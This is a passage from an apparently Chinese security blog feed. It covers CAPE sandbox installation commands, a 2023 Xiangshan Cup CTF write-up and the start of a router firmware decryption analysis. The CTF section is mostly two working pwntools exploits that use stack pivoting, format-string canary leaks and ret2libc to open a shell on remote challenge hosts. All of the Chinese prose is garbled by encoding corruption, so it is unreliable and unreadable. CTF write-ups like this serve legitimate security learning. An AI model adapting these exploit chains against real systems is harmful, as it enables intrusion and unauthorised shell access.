<li>å®‰è£…Ubuntu20.04ï¼Œæˆ‘çš„VBä¸Šæœ‰ï¼Œå› æ­¤å°±ä¸å†å®‰è£…äº†</li>
<li>å¯ç”¨VT-x/AMD-Vï¼Œwin11é»˜è®¤å¼€å¯Hyper-Vï¼Œä¸VBçš„VT-x/AMD-Vå†²çªï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥æ‰“å¼€winçš„cmd<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; cd &quot;Your_Virtualbox_path&quot;</span><br><span class="line"></span><br><span class="line">&gt; VBoxManage.exe list vms</span><br><span class="line">cmdå›æ˜¾: &quot;vm_name&quot; &#123;vm_series&#125;</span><br><span class="line"></span><br><span class="line">&gt; VBoxManage.exe modifyvm &quot;vm_name&quot; --nested-hw-virt on</span><br></pre></td></tr></table></figure></li>
<li>è¿™ä¸ªæ—¶å€™å†æ‰“å¼€VirtualBoxï¼Œå°±ä¼šå‘ç°ä¹‹å‰å˜ç°çš„VT-x/AMD-Vå·²ç»å¯ç”¨äº†</li>
<li>è¿›å…¥ubuntu20.04ï¼Œç»ˆç«¯è¾“å…¥<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line"></span><br><span class="line">$ sudo apt install python3 -y</span><br><span class="line"></span><br><span class="line">$ sudo apt install python3-pip -y</span><br><span class="line"></span><br><span class="line">sudo apt install -y git make automake vim</span><br><span class="line"></span><br><span class="line">sudo apt install -y python-dpkt python-jinja2 python-magic python-pymongo python-libvirt python-bottle python-pefile python-chardet swig libssl-dev clamav-daemon python-geoip geoip-database mono-utils</span><br><span class="line"># è¿™å¥æŠ¥é”™äº†</span><br><span class="line"></span><br><span class="line">sudo apt install -y mongodb</span><br><span class="line"></span><br><span class="line">sudo apt install -y python python-pip python-setuptools python-virtualenv virtualenv</span><br><span class="line"># è¿™å¥æŠ¥é”™äº†</span><br><span class="line"></span><br><span class="line">sudo apt install -y apparmor-utils</span><br><span class="line"></span><br><span class="line">sudo aa-disable /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line"># for users who are not root (in this case, user name is &quot;infected&quot;)</span><br><span class="line">sudo usermod -a -G vboxusers infected</span><br><span class="line"></span><br><span class="line">sudo groupadd pcap</span><br><span class="line"></span><br><span class="line"># in this case, user name is &quot;infected&quot; as well</span><br><span class="line">sudo usermod -a -G pcap infected</span><br><span class="line"></span><br><span class="line">sudo chgrp pcap /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">sudo apt install -y virtualbox</span><br><span class="line"></span><br><span class="line">sudo vboxmanage hostonlyif create</span><br><span class="line"></span><br><span class="line">sudo vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"># è¿™ä¸€æ­¥å³ä½¿ç”¨é­”æ³•ä¹Ÿä¼šå‡ºç°æ–­è¿æƒ…å†µï¼Œæœ‰äº›ä¸ç¨³å®šï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡æˆ–è€…æ¢æºï¼Œæˆ‘ç§‘å­¦ä¸Šç½‘ç¬¬äºŒæ¬¡å°±æˆåŠŸäº†</span><br><span class="line">pip3 install Pillow==8.0.1</span><br><span class="line"></span><br><span class="line"># wget https://raw.githubusercontent.com/doomedraven/Tools/master/Sandbox/cape2.shæŒ‰ç…§åŸæ•™ç¨‹çš„è¿™ä¸ªç½‘å€æ˜¯å¾—ä¸åˆ°cape2.shè„šæœ¬çš„ï¼Œæ‰€ä»¥æˆ‘åœ¨capeå®˜ç½‘ç›´æ¥æ‰¾åˆ°äº†ä»–ä»¬çš„åŸè„šæœ¬</span><br><span class="line">wget https://raw.githubusercontent.com/kevoreilly/CAPEv2/master/installer/cape2.sh</span><br><span class="line"># ä½†ä¸Šé¢è¿™ä¸ªä¹Ÿå¤±è´¥äº†ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æµè§ˆå™¨æ‰“å¼€ä¸Šé¢è¿™ä¸ªç½‘é¡µï¼Œå¤åˆ¶å…¨éƒ¨ï¼Œç„¶åå†ubuntuä¸­ç”¨viç²˜è´´åˆ°æ–°è„šæœ¬ä¸Šï¼Œç„¶å:wqä¿å­˜é€€å‡ºï¼Œå†ç»§ç»­ä¸‹é¢çš„å†…å®¹å³å¯</span><br><span class="line">vi cape2.sh</span><br><span class="line"></span><br><span class="line">$ chmod a+x cape2.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./cape2.sh base cape</span><br><span class="line"></span><br><span class="line">sudo apt install -y mongodb</span><br></pre></td></tr></table></figure></li>
<li>é…ç½®è™šæ‹Ÿæœº<ol>
<li><a href="https://www.zhihu.com/question/62359057">https://www.zhihu.com/question/62359057</a> ä¸‹è½½windows7ä»»æ„ç‰ˆæœ¬iso</li>
<li>åŠ è½½åˆ°ubuntu2004çš„VBä¸­</li>
</ol>
</li>
</ul>
</li>
</ul>
<h1 id="0x01-WSL2-virtualbox"><a href="#0x01-WSL2-virtualbox" class="headerlink" title="0x01  WSL2 + virtualbox"></a>0x01  WSL2 + virtualbox</h1><h1 id="At-Last"><a href="#At-Last" class="headerlink" title="At Last"></a>At Last</h1><ul>
<li><strong>å‚è€ƒæ–‡çŒ®</strong><ol>
<li><a href="https://notes.netbytesec.com/2020/12/cape-sandbox-installation-from-0-to-hero.html">https://notes.netbytesec.com/2020/12/cape-sandbox-installation-from-0-to-hero.html</a></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>SoftwareProtection</tag>
      </tags>
  </entry>
  <entry>
    <title>2023é¦™å±±æ¯Pwn &amp; RE-wp</title>
    <url>/2023/10/15/blog12/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
é¦™å±±æ¯ï¼Pwn ak + RE å·®å‡ åˆ†é’Ÿå°±xxTEAå†™å®Œå•¦ğŸ˜­
</blockquote>

<span id="more"></span>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h3 id="urlä»å“ªå„¿æ¥"><a href="#urlä»å“ªå„¿æ¥" class="headerlink" title="urlä»å“ªå„¿æ¥"></a>urlä»å“ªå„¿æ¥</h3><p><img src="/pic/image-1.png" alt=""></p>
<p>æ–­ç‚¹ä¸‹åœ¨è¿™ï¼ŒçŸ¥é“ä»–ä¼šåœ¨bufferæŒ‡å‘çš„åœ°å€ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œè®©ç¨‹åºè·‘å®Œï¼Œèƒ½çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶<br><img src="/pic/image-2.png" alt=""><br>idaæ‰“å¼€ï¼Œå› ä¸ºå®ƒé—®urlæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹szurl<br><img src="/pic/image-3.png" alt=""><br>ç»“æœè¿™ä¸ªä¸æ˜¯flagï¼Œçœ‹åˆ°urlé—®æˆ‘ä»¬æ˜¯å¦‚ä½•è§£å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å›åˆ°ä¸Šé¢é‚£ä¸€å †æ•°æ®é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹v13<br><img src="/pic/image-4.png" alt=""><br>flagå°±åœ¨è¿™<br><img src="/pic/image-5.png" alt=""></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>æ ˆè¿ç§»åˆ°bssæ®µçš„skddï¼Œæ³„éœ²putsï¼ŒlibcsearcheræŸ¥åˆ°putsçš„libcæ˜¯2.27ï¼Œglibc-all-in-oneä¸‹ä¸€ä¸ªå‡ºæ¥ï¼Œç„¶åè¿”å›mainå‡½æ•°<br>åœ¨skddé‡Œå†™system(â€œ/bin/shâ€)ï¼Œæœ¬æ¥æ˜¯æƒ³å†æ ˆè¿ç§»ä¸€éï¼Œç»“æœå‘ç°ç›´æ¥do_systemäº†ï¼Œç¨å¾®ä¿®æ”¹äº†ä¸€ä¸‹å°±getshelläº†<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># expå¤´ ---------------------------------------------------------------</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;59.110.125.41&#x27;</span><br><span class="line">port = 45341</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line">bss_addr = 0x4050A0</span><br><span class="line">lea_addr = 0x4012E0</span><br><span class="line">junk = 0x30</span><br><span class="line">pop_rdi = 0x401353</span><br><span class="line">start_addr = 0x401264</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line">io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ ˆåŠ«æŒ ---------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh    = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># sh_addr = 0x402027</span><br><span class="line">ret_addr = 0x40101a</span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line"># io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># io.send(payloadload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401350 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401352 : pop r15 ; ret</span><br><span class="line">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040119d : pop rbp ; ret</span><br><span class="line">0x0000000000401353 : pop rdi ; ret</span><br><span class="line">0x0000000000401351 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="Pwthon"><a href="#Pwthon" class="headerlink" title="Pwthon"></a>Pwthon</h3><p>Cpython pwn<br>æ ¸å¿ƒé€»è¾‘åœ¨.soæ–‡ä»¶é‡Œï¼Œç›²æ‰“è¯•åˆ°æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæµ‹è¯•å‡ºæ ˆå¤§å°ï¼Œæ³„éœ²å‡ºå¿…è¦çš„ä¿¡æ¯å°±èƒ½ret2libcäº†<br>giftæ³„éœ²åŸºåœ°å€å’Œè¿”å›åœ°å€<br>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canary<br>é€šè¿‡putsæ³„éœ²libc<br>ret2libc<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;39.106.48.123&#x27;</span><br><span class="line">port = 29572</span><br><span class="line"># file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;0&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;gift&#x27;)</span><br><span class="line">gift = int(io.recvuntil(&#x27;\n&#x27;),16)</span><br><span class="line">base = gift- 0x68B0</span><br><span class="line">print(&#x27;base&#x27;,base)</span><br><span class="line"></span><br><span class="line">print(&#x27;gift&#x27;,gift)</span><br><span class="line">io.sendline(b&#x27;%p-&#x27;*31+b&#x27;q%pq&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;q&#x27;)</span><br><span class="line">canary = int(io.recvuntil(b&#x27;q&#x27;,drop=&#x27;Ture&#x27;),16)</span><br><span class="line">print(&#x27;canary&#x27;,canary)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000003f8f + base</span><br><span class="line">pop_rsi = 0x0000000000003cd9 + base</span><br><span class="line">bss = 0x016FC0+0x100+base</span><br><span class="line">read = 0x3940+base</span><br><span class="line">write = 0x03760+base</span><br><span class="line">op = 0x3AE0+base</span><br><span class="line">flag = 0x000000000003c257+base</span><br><span class="line">puts = 0x3710+base</span><br><span class="line">ret = 0x000000000000301a+base</span><br><span class="line"></span><br><span class="line">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span><br><span class="line">payload = p64(0)*33+p64(canary)*2+p64(pop_rdi)+p64(0x16078+base)+p64(puts)+p64(base+0x99f0)</span><br><span class="line">#payload = b&#x27;a&#x27;</span><br><span class="line">io.send(b&#x27;&#x27;)</span><br><span class="line">print(&quot;len &quot;,len(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0)*32+p64(canary)*3+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(b&#x27;a&#x27;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://localhost:4000/pic/imagexsb.png" alt=""></p>
]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>IOTâ€”æŸè·¯ç”±å™¨mipså›ºä»¶è§£å¯†è„šæœ¬å¤ç°</title>
    <url>/2023/11/09/blog16/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æœŸä¸­ç»ˆäºç»“æŸäº†ğŸ˜­å¤ç°ä¸€ä¸‹bç«™Wker666çš„å›ºä»¶è§£å¯†
</blockquote>


<span id="more"></span>
<blockquote>
<p>ç¬¬ä¸€æ¬¡åˆ†æIOTå›ºä»¶ï¼Œä¸å½“ä¹‹å¤„è¯·æŒ‡å‡ºğŸ˜­</p>
</blockquote>
<h1 id="0xFF-å‰ç½®çŸ¥è¯†"><a href="#0xFF-å‰ç½®çŸ¥è¯†" class="headerlink" title="0xFF å‰ç½®çŸ¥è¯†"></a>0xFF å‰ç½®çŸ¥è¯†</h1><ol>
<li><p>å¤šæ•°æƒ…å†µä¸‹ï¼Œè·¯ç”±å™¨å›ºä»¶è§£åŒ…ä»¥åæˆ‘ä»¬ä¼šæ‹¿åˆ°ä¸€ä¸ªç±»ä¼¼äº Linux æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¼šè·‘ä¸€äº›ä¸‰ç¯ç¨‹åºï¼Œè€Œä¸‰ç¯ç¨‹åºæœ‰éå¸¸å¤šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›é€šè¿‡è¿™äº›ä¸‰ç¯ç¨‹åºæ¥ææƒã€‚</p>
</li>
<li><p>ç°åœ¨å¾ˆå¤šå‚å•†ä¼šè®¤ä¸ºï¼Œè‡ªå·±çš„è·¯ç”±å™¨èƒ½è¢«è§£åŒ…å¤ªä¸å®‰å…¨äº†ï¼Œå› æ­¤ä»–ä»¬ä¼šé€šè¿‡åŠ å¯†ï¼Œä½†æ˜¯æ¯æ¬¡æ›´æ–°æ¢ä»£æ—¶ï¼Œåä¸€ä»£çš„å›ºä»¶åŒ…éƒ½æ˜¯é€šè¿‡å‰ä¸€ä»£çš„å›ºä»¶ä¸­çš„æŸä¸ªè§£å¯†ç®—æ³•æ¥è§£å¯†çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨æŒ–æ˜ IOT æ¼æ´æ—¶ï¼Œä¼šå…ˆæ‰¾åˆ°æ¯”è¾ƒè€çš„ä¸€äº›ç‰ˆæœ¬ï¼Œåˆ†æè§£å¯†ç®—æ³•ï¼Œè¿›è€Œè‡ªå·±å†™å‡ºè§£å¯†è„šæœ¬æ¥è§£å¯†æ–°ä¸€ä»£çš„å›ºä»¶åŒ…ã€‚</p>
</li>
<li><p>(å»ºè®®çœ‹åˆ°0x01åå†æ¥é˜…è¯»æœ¬æ¡)æˆ‘ä»¬åœ¨è·¯ç”±å™¨çš„ web user ä¸Šå‘é€ä¸€ä¸ªæ›´æ–°è¯·æ±‚çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šå…ˆå‘ç»™æœåŠ¡å™¨ä¸€ä¸ª http è¯·æ±‚ï¼Œç„¶åè¢«æœåŠ¡å™¨çš„ httpd äºŒè¿›åˆ¶æ–‡ä»¶æ¥æ”¶ï¼Œhttpd ä¼š fork ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥å¯ç”¨äºŒè¿›åˆ¶æ–‡ä»¶ cgibin ï¼Œå¹¶æŠŠç¯å¢ƒå˜é‡å’Œ http çš„è¯·æ±‚å‘ç»™ cgi ï¼Œ cgi å®Œæˆå¤„ç†ä»¥åï¼ŒæŠŠå†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæµä¹‹ç±»çš„ä¸œè¥¿ï¼Œå¹¶è¿”å›å®¢æˆ·</p>
</li>
<li><p>IDA åç¼–è¯‘ Mips æ–‡ä»¶ä¼šæœ‰å¾ˆå¤šâ€œæ— ç”¨æ“ä½œâ€ï¼Œå°±æ˜¯ä¸¤ä¸ªå˜é‡æ¥å›èµ‹å€¼ä¹‹ç±»çš„ï¼Œè¿™æ˜¯ç”±äº Mips æœ‰åˆ†æ”¯å»¶è¿Ÿçš„ç‰¹æ€§</p>
</li>
</ol>
<h1 id="0x00-å‡†å¤‡å·¥ä½œ"><a href="#0x00-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x00 å‡†å¤‡å·¥ä½œ"></a>0x00 å‡†å¤‡å·¥ä½œ</h1><p><img src="https://i0.imgs.ovh/2023/11/09/lto8e.png" alt="lto8e.png"><br>ä¸Šå›¾ä¸­é—´æœ‰è¿™æ ·ä¸€å¥è¯<code>Upgrade to Firmware V2.10 and then instantly go back into the web user interface and upgrade to Firmware V2.20</code></p>
<p>å®ƒå‘Šè¯‰æˆ‘ä»¬ï¼Œä»web useræ›´æ–°åˆ°2.2ç‰ˆæœ¬æ—¶ï¼Œéœ€è¦å…ˆä»å®˜ç½‘ä¸‹è½½2.1çš„å›ºä»¶å¹¶æ›´æ–°åˆ°2.1æ‰è¡Œ</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ2.2å¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªåŠ å¯†å›ºä»¶åŒ…ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡<code>binwalk</code>ç›´æ¥è§£åŒ…ï¼Œä½†æ˜¯2.1å¯ä»¥</p>
<p>æˆ‘ä»¬downloadä¸¤ä¸ªåŒ…åˆ°æœ¬åœ°binwalkè§£åŒ…ä¸€ä¸‹çœ‹çœ‹</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/ltiAU.png" alt="ltiAU.png"></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/ltjx0.png" alt="ltjx0.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®åƒæˆ‘ä»¬çŒœæƒ³çš„é‚£æ ·ï¼ŒV2.1æœªåŠ å¯†ï¼ŒV2.2åŠ å¯†</p>
<h1 id="0x01-å®šä½è§£å¯†é€»è¾‘"><a href="#0x01-å®šä½è§£å¯†é€»è¾‘" class="headerlink" title="0x01 å®šä½è§£å¯†é€»è¾‘"></a>0x01 å®šä½è§£å¯†é€»è¾‘</h1><p>é€šè¿‡ <strong>0xFF.3</strong> æˆ‘ä»¬çŸ¥é“è¦åˆ†æcgibinå’Œhttpdæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨IDAæ‰“å¼€çœ‹ä¸€ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgibin : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/htdocs</span><br><span class="line"></span><br><span class="line">httpd : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/sbin</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹åœ¨æœ¬æ–‡ä¸­ä¸é‚£ä¹ˆé‡è¦çš„ httpd æ–‡ä»¶ï¼ŒIDA7.6 ä»¥ä¸Šçš„ç‰ˆæœ¬æ˜¯å¯ä»¥åç¼–è¯‘ Mips çš„<br><img src="https://i0.imgs.ovh/2023/11/09/l12OW.png" alt="l12OW.png"><br>æˆ‘ä»¬åœ¨ function ä¸­æœç´¢ cgiï¼Œæ‰¾åˆ°<code>process_cgi</code>å‡½æ•°ï¼Œå¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰å¾ˆå¤šç¯å¢ƒå˜é‡å¦‚<code>GATEWAY_INTERFACE</code>å’Œ<code>CONTENT_LENGTH</code>ç­‰ï¼Œåœ¨è®¾ç½®å®Œç¯å¢ƒå˜é‡åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè°ƒç”¨äº†<code>spawn</code>å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹<br><img src="https://i0.imgs.ovh/2023/11/09/l1ZZe.png" alt="l1ZZe.png"></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1lK3.png" alt="l1lK3.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ <strong>Line20</strong> çš„ä½ç½®ï¼Œè¯¥è¿›ç¨‹æ˜¯è¢«forkèµ·æ¥çš„ï¼Œè€Œåœ¨ <strong>Line46</strong> çš„ä½ç½®ï¼Œæˆ‘ä»¬æ‰§è¡Œäº† <code>execve</code> ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ execve çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯argvï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æˆ‘ä»¬å›æº¯ä¸€ä¸‹</p>
<p>è€Œåœ¨è°ƒç”¨ <code>spawn</code> çš„å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œspawn çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>*v77,v77,ptr</code>,è¿™é‡Œçš„ v77 å°±æ˜¯ file_pathï¼Œè€Œ ptr å°±æ˜¯ env_ptrï¼Œæˆ‘ä»¬æ¥ç€æº¯æº(æº¯æºçš„æ—¶å€™æˆ‘ä»¬ä¼šå‘ç° file_path çš„è°ƒç”¨å¤„éå¸¸å°‘ï¼Œè¿™æ˜¯å› ä¸º ida çš„åç¼–è¯‘å¹¶æ²¡æœ‰å°† file_path çš„æ•°æ®ç±»å‹æ­£ç¡®å¤„ç†ï¼Œå¯¼è‡´ file_path ä¸‹é¢çš„ä¸€äº›å˜é‡ï¼Œå…¶å®å¯èƒ½å°±æ˜¯ file_pathï¼Œä½†å› ä¸ºå¤„ç†é”™äº†ï¼Œæ‰€ä»¥è¢«å‘½åä¸º v78 v79 â€¦)</p>
<p>å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æŒ¨ä¸ªåˆ†æï¼Œè€Œå½“æˆ‘ä»¬çœ‹åˆ° v80 æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å¯¹ v80 è¢«åšäº†æ‰‹è„šï¼ŒWker666 è¯´è¿™é‡Œæ˜¯å¯¹ cgi è¿›è¡Œä¸€äº›é€‰æ‹©ï¼Œä½†æˆ‘ STFW ä»¥åä¹Ÿæ²¡æ‰¾åˆ°åŸå› ï¼Œå…ˆæç½®ä¸€ä¸‹å§</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1tB2.png" alt="l1tB2.png"></p>
<p>è‡³æ­¤ï¼Œhttpd å°±åˆ†æå®Œäº†ï¼Œhttpdä¸»è¦æ˜¯åšå‰ç«¯ç”¨çš„ï¼Œå®ƒæœ¬èº«ä¹Ÿæœ‰ä¸€äº›æ¼æ´ï¼Œä¸è¿‡è¿™é‡Œå°±ä¸å†åˆ†æäº†ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹cgibin</p>
<hr>
<p>æˆ‘ä»¬ç”¨ IDA æ‰“å¼€ cgibin æ–‡ä»¶ï¼Œå¾€ä¸‹æ‰¾åˆ° seamacgi_main (è¿™é‡Œæ²¡æ‰¾åˆ° seama åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€ï¼Œåªæ˜¯å› ä¸ºåœ¨ function ä¸­æœç´¢ enc å¯ä»¥æ‰¾åˆ° encrypt_main ï¼Œæº¯æºåˆ†æå°±èƒ½æ‰¾åˆ° semacgi_main äº†)<br><img src="https://i0.imgs.ovh/2023/11/09/l111j.png" alt="l111j.png"></p>
<p>è·Ÿè¿› semacgi_main ,å¯ä»¥æ‰¾åˆ° encrypt_main å‡½æ•°ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„è§£å¯†å‡½æ•°äº†</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1UfV.png" alt="l1UfV.png"></p>
